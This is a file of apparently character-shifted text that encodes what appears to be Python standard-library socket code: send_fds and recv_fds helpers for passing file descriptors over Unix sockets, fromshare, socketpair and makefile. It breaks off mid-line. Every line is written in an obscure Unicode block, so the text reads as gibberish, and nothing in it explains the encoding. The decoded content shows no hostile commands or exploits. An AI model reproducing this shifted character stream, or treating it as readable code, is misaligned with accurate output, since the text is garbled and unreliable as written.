ꚫꚫꚫꚫꚫꚭꚭꚭꚫ꛽꛰ꛮ꜁ꛪ꛱ꛯ꛾ꚳ꛾꛺ꛮ꛶ꚷꚫꛭ꜀꛱꛾꛴꜅꛰ꚷꚫ꛸ꛬ꜃꛱ꛯ꛾ꛦꚷꚫ꛱꛷ꛬ꛲꛾ꛨꚴꚫꚸꛉꚫꚳꛯꛬ꛿ꛬꚷꚫ꛷꛴꛾꛿ꚫ꛺꛱ꚫ꛱꛴꛷꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽꛾ꚷꚫ꛸꛾꛲ꛪ꛱꛷ꛬ꛲꛾ꚷꚫꛬꛯꛯ꛽꛰꛾꛾ꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛝ꛰ꛮ꛰꛴꜁꛰ꚫ꜀꛻ꚫ꛿꛺ꚫ꛸ꛬ꜃꛱ꛯ꛾ꚫ꛱꛴꛷꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽꛾ꚫ꛽꛰꛿꜀꛽꛹꛴꛹꛲ꚫ꛿꛳꛰ꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯꛬ꛿ꛬꚫꛬ꛹ꛯꚫꛬꚫ꛷꛴꛾꛿ꚫꛮ꛺꛹꛿ꛬ꛴꛹꛴꛹꛲ꚫ꛿꛳꛰ꚫꛯ꛰꛾ꛮ꛽꛴꛻꛿꛺꛽꛾ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛌ꛽꛽ꛬ꜄ꚫ꛺꛱ꚫ꛴꛹꛿꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꛯ꛾ꚫꛈꚫꛬ꛽꛽ꛬ꜄ꚹꛬ꛽꛽ꛬ꜄ꚳꚭ꛴ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛸꛾꛲ꚷꚫꛬ꛹ꛮꛯꛬ꛿ꛬꚷꚫ꛱꛷ꛬ꛲꛾ꚷꚫꛬꛯꛯ꛽ꚫꛈꚫ꛾꛺ꛮ꛶ꚹ꛽꛰ꛮ꜁꛸꛾꛲ꚳꛭ꜀꛱꛾꛴꜅꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹꛎꛘꛞꛒꛪꛗꛐꛙꚳ꛸ꛬ꜃꛱ꛯ꛾ꚫꚵꚫ꛱ꛯ꛾ꚹ꛴꛿꛰꛸꛾꛴꜅꛰ꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛺꛽ꚫꛮ꛸꛾꛲ꛪ꛷꛰꜁꛰꛷ꚷꚫꛮ꛸꛾꛲ꛪ꛿꜄꛻꛰ꚷꚫꛮ꛸꛾꛲ꛪꛯꛬ꛿ꛬꚫ꛴꛹ꚫꛬ꛹ꛮꛯꛬ꛿ꛬꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꚳꛮ꛸꛾꛲ꛪ꛷꛰꜁꛰꛷ꚫꛈꛈꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹꛞꛚꛗꛪꛞꛚꛎꛖꛐꛟꚫꛬ꛹ꛯꚫꛮ꛸꛾꛲ꛪ꛿꜄꛻꛰ꚫꛈꛈꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹꛞꛎꛘꛪꛝꛔꛒꛓꛟꛞꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꛯ꛾ꚹ꛱꛽꛺꛸ꛭ꜄꛿꛰꛾ꚳꛮ꛸꛾꛲ꛪꛯꛬ꛿ꛬꛦꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛷꛰꛹ꚳꛮ꛸꛾꛲ꛪꛯꛬ꛿ꛬꚴꚫꚸꚫꚳ꛷꛰꛹ꚳꛮ꛸꛾꛲ꛪꛯꛬ꛿ꛬꚴꚫꚰꚫ꛱ꛯ꛾ꚹ꛴꛿꛰꛸꛾꛴꜅꛰ꚴꛨꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛸꛾꛲ꚷꚫ꛷꛴꛾꛿ꚳ꛱ꛯ꛾ꚴꚷꚫ꛱꛷ꛬ꛲꛾ꚷꚫꛬꛯꛯ꛽ꚕꚫꚫꚫꚫꛪꛪꛬ꛷꛷ꛪꛪꚹꛬ꛻꛻꛰꛹ꛯꚳꚭ꛽꛰ꛮ꜁ꛪ꛱ꛯ꛾ꚭꚴꚕꚕ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚭ꛾꛳ꛬ꛽꛰ꚭꚴꛅꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛱꛽꛺꛸꛾꛳ꛬ꛽꛰ꚳ꛴꛹꛱꛺ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚫ꛱꛽꛺꛸꛾꛳ꛬ꛽꛰ꚳ꛴꛹꛱꛺ꚴꚫꚸꛉꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛎ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫꛭ꜄꛿꛰꛾ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛳ꛬ꛽꛰ꚳ꛻꛴ꛯꚴꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛺ꛮ꛶꛰꛿ꚳꚻꚷꚫꚻꚷꚫꚻꚷꚫ꛴꛹꛱꛺ꚴꚕꚫꚫꚫꚫꛪꛪꛬ꛷꛷ꛪꛪꚹꛬ꛻꛻꛰꛹ꛯꚳꚭ꛱꛽꛺꛸꛾꛳ꛬ꛽꛰ꚭꚴꚕꚕ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛺ꛮ꛶꛰꛿ꚷꚫꚭ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚭꚴꛅꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚳ꛱ꛬ꛸꛴꛷꜄ꛈꛙ꛺꛹꛰ꚷꚫ꛿꜄꛻꛰ꛈꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚷꚫ꛻꛽꛺꛿꛺ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚳꛦ꛱ꛬ꛸꛴꛷꜄ꛦꚷꚫ꛿꜄꛻꛰ꛦꚷꚫ꛻꛽꛺꛿꛺ꛨꛨꛨꚴꚫꚸꛉꚫꚳ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚷꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛎ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛻ꛬ꛴꛽ꚫ꛺꛱ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿꛾ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚫ꛿꛳꛰ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚳꚴꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛟ꛳꛰ꚫꛬ꛽꛲꜀꛸꛰꛹꛿꛾ꚫꛬ꛽꛰ꚫ꛿꛳꛰ꚫ꛾ꛬ꛸꛰ꚫꛬ꛾ꚫ꛱꛺꛽ꚫ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛿꛳꛰ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛱ꛬ꛸꛴꛷꜄ꚫ꛴꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛌꛑꛪꛠꛙꛔꛣꚫ꛴꛱ꚫꛯ꛰꛱꛴꛹꛰ꛯꚫ꛺꛹ꚫ꛿꛳꛰ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꛆꚫ꛺꛿꛳꛰꛽꜂꛴꛾꛰ꚷꚫ꛿꛳꛰ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛴꛾ꚫꛌꛑꛪꛔꛙꛐꛟꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱ꛬ꛸꛴꛷꜄ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꛬ꛸꛴꛷꜄ꚫꛈꚫꛌꛑꛪꛠꛙꛔꛣꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛙꛬ꛸꛰ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꛬ꛸꛴꛷꜄ꚫꛈꚫꛌꛑꛪꛔꛙꛐꛟꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬꚷꚫꛭꚫꛈꚫꛪ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚳ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꛬꚫꛈꚫ꛾꛺ꛮ꛶꛰꛿ꚳ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚷꚫꛬꚹꛯ꛰꛿ꛬꛮ꛳ꚳꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꛭꚫꛈꚫ꛾꛺ꛮ꛶꛰꛿ꚳ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚷꚫꛭꚹꛯ꛰꛿ꛬꛮ꛳ꚳꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛬꚷꚫꛭꚕꚕ꛰꛷꛾꛰ꛅꚕꚕꚫꚫꚫꚫꚮꚫꛚ꛽꛴꛲꛴꛹ꛅꚫ꛳꛿꛿꛻꛾ꛅꚺꚺ꛲꛴꛾꛿ꚹ꛲꛴꛿꛳꜀ꛭꚹꛮ꛺꛸ꚺꚿꚾꚽꛀꛂꛃꚾꚷꚫꛭ꜄ꚫꛒ꛰꛰꛽꛿ꚫꛕꛬ꛹꛾꛰꛹ꚹꚫꚫꛛ꜀ꛭ꛷꛴ꛮꚫꛯ꛺꛸ꛬ꛴꛹ꚹꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚳ꛱ꛬ꛸꛴꛷꜄ꛈꛌꛑꛪꛔꛙꛐꛟꚷꚫ꛿꜄꛻꛰ꛈꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚷꚫ꛻꛽꛺꛿꛺ꛈꚻꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛱ꛬ꛸꛴꛷꜄ꚫꛈꛈꚫꛌꛑꛪꛔꛙꛐꛟꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛳꛺꛾꛿ꚫꛈꚫꛪꛗꛚꛎꛌꛗꛓꛚꛞꛟꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛴꛱ꚫ꛱ꛬ꛸꛴꛷꜄ꚫꛈꛈꚫꛌꛑꛪꛔꛙꛐꛟꛁꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛳꛺꛾꛿ꚫꛈꚫꛪꛗꛚꛎꛌꛗꛓꛚꛞꛟꛪꛡꛁꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛚ꛹꛷꜄ꚫꛌꛑꛪꛔꛙꛐꛟꚫꛬ꛹ꛯꚫꛌꛑꛪꛔꛙꛐꛟꛁꚫ꛾꛺ꛮ꛶꛰꛿ꚫꛬꛯꛯ꛽꛰꛾꛾ꚫ꛱ꛬ꛸꛴꛷꛴꛰꛾ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛬ꛽꛰ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꜄꛻꛰ꚫꚬꛈꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛚ꛹꛷꜄ꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛿꜄꛻꛰ꚫ꛴꛾ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛻꛽꛺꛿꛺ꚫꚬꛈꚫꚻꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛚ꛹꛷꜄ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꜅꛰꛽꛺ꚫ꛴꛾ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚭꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛢ꛰ꚫꛮ꛽꛰ꛬ꛿꛰ꚫꛬꚫꛮ꛺꛹꛹꛰ꛮ꛿꛰ꛯꚫꛟꛎꛛꚫ꛾꛺ꛮ꛶꛰꛿ꚹꚫꛙ꛺꛿꛰ꚫ꛿꛳꛰ꚫ꛿꛽꛴ꛮ꛶ꚫ꜂꛴꛿꛳ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫ꛾꛰꛿ꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚳꛑꛬ꛷꛾꛰ꚴꚫ꛿꛳ꛬ꛿ꚫ꛻꛽꛰꜁꛰꛹꛿꛾ꚫ꜀꛾ꚫ꛱꛽꛺꛸ꚫ꛳ꛬ꜁꛴꛹꛲ꚫ꛿꛺ꚫꛮ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛿꛳꛽꛰ꛬꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛷꛾꛺ꛮ꛶ꚫꛈꚫ꛾꛺ꛮ꛶꛰꛿ꚳ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛷꛾꛺ꛮ꛶ꚹꛭ꛴꛹ꛯꚳꚳ꛳꛺꛾꛿ꚷꚫꚻꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛷꛾꛺ꛮ꛶ꚹ꛷꛴꛾꛿꛰꛹ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛚ꛹ꚫꛔꛛ꜁ꛁꚷꚫ꛴꛲꛹꛺꛽꛰ꚫ꛱꛷꛺꜂ꛪ꛴꛹꛱꛺ꚫꛬ꛹ꛯꚫ꛾ꛮ꛺꛻꛰ꛪ꛴ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛬꛯꛯ꛽ꚷꚫ꛻꛺꛽꛿ꚫꛈꚫ꛷꛾꛺ꛮ꛶ꚹ꛲꛰꛿꛾꛺ꛮ꛶꛹ꛬ꛸꛰ꚳꚴꛦꛅꚽꛨꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛾꛺ꛮ꛶ꚫꛈꚫ꛾꛺ꛮ꛶꛰꛿ꚳ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛾꛺ꛮ꛶ꚹ꛾꛰꛿ꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚳꛑꛬ꛷꛾꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛾꛺ꛮ꛶ꚹꛮ꛺꛹꛹꛰ꛮ꛿ꚳꚳꛬꛯꛯ꛽ꚷꚫ꛻꛺꛽꛿ꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꚳꛍ꛷꛺ꛮ꛶꛴꛹꛲ꛔꛚꛐ꛽꛽꛺꛽ꚷꚫꛔ꛹꛿꛰꛽꛽꜀꛻꛿꛰ꛯꛐ꛽꛽꛺꛽ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛾꛺ꛮ꛶ꚹ꛾꛰꛿ꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚳꛟ꛽꜀꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛾꛺ꛮ꛶ꚷꚫꛪꚫꛈꚫ꛷꛾꛺ꛮ꛶ꚹꛬꛮꛮ꛰꛻꛿ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛾꛺ꛮ꛶ꚹꛮ꛷꛺꛾꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛹ꛬ꛷꛷꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛷꛾꛺ꛮ꛶ꚹꛮ꛷꛺꛾꛰ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꚳ꛾꛾꛺ꛮ꛶ꚷꚫꛮ꛾꛺ꛮ꛶ꚴꚕꚫꚫꚫꚫꛪꛪꛬ꛷꛷ꛪꛪꚹꛬ꛻꛻꛰꛹ꛯꚳꚭ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚭꚴꚕꚕ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚹꛪꛪꛯ꛺ꛮꛪꛪꚫꛈꚫꚭꚭꚭ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚳꛦ꛱ꛬ꛸꛴꛷꜄ꛦꚷꚫ꛿꜄꛻꛰ꛦꚷꚫ꛻꛽꛺꛿꛺ꛨꛨꛨꚴꚫꚸꛉꚫꚳ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚷꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚴꚕꛎ꛽꛰ꛬ꛿꛰ꚫꛬꚫ꛻ꛬ꛴꛽ꚫ꛺꛱ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿꛾ꚫ꛱꛽꛺꛸ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚫ꛿꛳꛰ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚕ꛾꛺ꛮ꛶꛰꛿꛻ꛬ꛴꛽ꚳꚴꚫ꛱꜀꛹ꛮ꛿꛴꛺꛹ꚹꚕꛟ꛳꛰ꚫꛬ꛽꛲꜀꛸꛰꛹꛿꛾ꚫꛬ꛽꛰ꚫ꛿꛳꛰ꚫ꛾ꛬ꛸꛰ꚫꛬ꛾ꚫ꛱꛺꛽ꚫ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚫ꛰꜃ꛮ꛰꛻꛿ꚫ꛿꛳꛰ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛱ꛬ꛸꛴꛷꜄ꚫ꛴꛾ꚫꛌꛑꛪꛠꛙꛔꛣꚕ꛴꛱ꚫꛯ꛰꛱꛴꛹꛰ꛯꚫ꛺꛹ꚫ꛿꛳꛰ꚫ꛻꛷ꛬ꛿꛱꛺꛽꛸ꛆꚫ꛺꛿꛳꛰꛽꜂꛴꛾꛰ꚷꚫ꛿꛳꛰ꚫꛯ꛰꛱ꛬ꜀꛷꛿ꚫ꛴꛾ꚫꛌꛑꛪꛔꛙꛐꛟꚹꚕꚭꚭꚭꚕꚕꛪꛭ꛷꛺ꛮ꛶꛴꛹꛲ꛪ꛰꛽꛽꛹꛺꛾ꚫꛈꚫ꜆ꚫꛐꛌꛒꛌꛔꛙꚷꚫꛐꛢꛚꛠꛗꛏꛍꛗꛚꛎꛖꚫ꜈ꚕꚕꛮ꛷ꛬ꛾꛾ꚫꛞ꛺ꛮ꛶꛰꛿ꛔꛚꚳ꛴꛺ꚹꛝꛬ꜂ꛔꛚꛍꛬ꛾꛰ꚴꛅꚕꚕꚫꚫꚫꚫꚭꚭꚭꛝꛬ꜂ꚫꛔꚺꛚꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿ꛬ꛿꛴꛺꛹ꚫ꛱꛺꛽ꚫ꛾꛿꛽꛰ꛬ꛸ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚹꚕꚕꚫꚫꚫꚫꛟ꛳꛴꛾ꚫꛮ꛷ꛬ꛾꛾ꚫ꛾꜀꛻꛻꛺꛽꛿꛾ꚫ꛿꛳꛰ꚫ꛸ꛬ꛶꛰꛱꛴꛷꛰ꚳꚴꚫ꛸꛰꛿꛳꛺ꛯꚫ꛺꛹ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚹꚫꚫꛔ꛿ꚫ꛻꛽꛺꜁꛴ꛯ꛰꛾ꚕꚫꚫꚫꚫ꛿꛳꛰ꚫ꛽ꛬ꜂ꚫꛔꚺꛚꚫ꛴꛹꛿꛰꛽꛱ꛬꛮ꛰ꚫ꛺꛹ꚫ꛿꛺꛻ꚫ꛺꛱ꚫꛬꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚹꚕꚫꚫꚫꚫꚭꚭꚭꚕꚕꚫꚫꚫꚫꚮꚫꛚ꛹꛰ꚫ꛸꛴꛲꛳꛿ꚫ꜂꛺꛹ꛯ꛰꛽ꚫ꜂꛳꜄ꚫ꛹꛺꛿ꚫ꛷꛰꛿ꚫꛑ꛴꛷꛰ꛔꛚꚫꛯ꛺ꚫ꛿꛳꛰ꚫ꛵꛺ꛭꚫ꛴꛹꛾꛿꛰ꛬꛯꚹꚫꚫꛟ꛳꛰꛽꛰ꚫꛬ꛽꛰ꚫ꛿꜂꛺ꚕꚫꚫꚫꚫꚮꚫ꛸ꛬ꛴꛹ꚫ꛽꛰ꛬ꛾꛺꛹꛾ꚫ꜂꛳꜄ꚫꛑ꛴꛷꛰ꛔꛚꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛬꛯꛬ꛻꛿꛰ꛯꛅꚕꚫꚫꚫꚫꚮꚫꚸꚫ꛴꛿ꚫ꜂꛺꜀꛷ꛯ꛹ꚲ꛿ꚫ꜂꛺꛽꛶ꚫ꜀꛹ꛯ꛰꛽ꚫꛢ꛴꛹ꛯ꛺꜂꛾ꚫꚳ꜂꛳꛰꛽꛰ꚫ꜄꛺꜀ꚫꛮꛬ꛹ꚲ꛿ꚫ꜀꛾꛰ꛯꚫ꛽꛰ꛬꛯꚳꚴꚫꛬ꛹ꛯꚕꚫꚫꚫꚫꚮꚫꚫꚫ꜂꛽꛴꛿꛰ꚳꚴꚫ꛺꛹ꚫꛬꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛳ꛬ꛹ꛯ꛷꛰ꚴꚕꚫꚫꚫꚫꚮꚫꚸꚫ꛴꛿ꚫ꜂꛺꜀꛷ꛯ꛹ꚲ꛿ꚫ꜂꛺꛽꛶ꚫ꜂꛴꛿꛳ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛿꛴꛸꛰꛺꜀꛿꛾ꚫꚳꛑ꛴꛷꛰ꛔꛚꚫ꜂꛺꜀꛷ꛯꚫ꛴꛲꛹꛺꛽꛰ꚫ꛿꛳꛰ꚕꚫꚫꚫꚫꚮꚫꚫꚫ꛿꛴꛸꛰꛺꜀꛿ꚫꛬ꛹ꛯꚫꛮ꛺꛹꛾꛴ꛯ꛰꛽ꚫ꛿꛳꛰ꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛹꛺꛹ꚸꛭ꛷꛺ꛮ꛶꛴꛹꛲ꚴꚕꚕꚫꚫꚫꚫꚮꚫꛣꛣꛣꚫꛘ꛺꛽꛰ꚫꛯ꛺ꛮ꛾ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛴꛹꛴꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꛾꛺ꛮ꛶ꚷꚫ꛸꛺ꛯ꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛸꛺ꛯ꛰ꚫ꛹꛺꛿ꚫ꛴꛹ꚫꚳꚭ꛽ꚭꚷꚫꚭ꜂ꚭꚷꚫꚭ꛽꜂ꚭꚷꚫꚭ꛽ꛭꚭꚷꚫꚭ꜂ꛭꚭꚷꚫꚭ꛽꜂ꛭꚭꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛴꛹꜁ꛬ꛷꛴ꛯꚫ꛸꛺ꛯ꛰ꛅꚫꚰ꛽ꚭꚫꚰꚫ꛸꛺ꛯ꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛺ꚹꛝꛬ꜂ꛔꛚꛍꛬ꛾꛰ꚹꛪꛪ꛴꛹꛴꛿ꛪꛪꚳ꛾꛰꛷꛱ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛺ꛮ꛶ꚫꛈꚫ꛾꛺ꛮ꛶ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꚭꛭ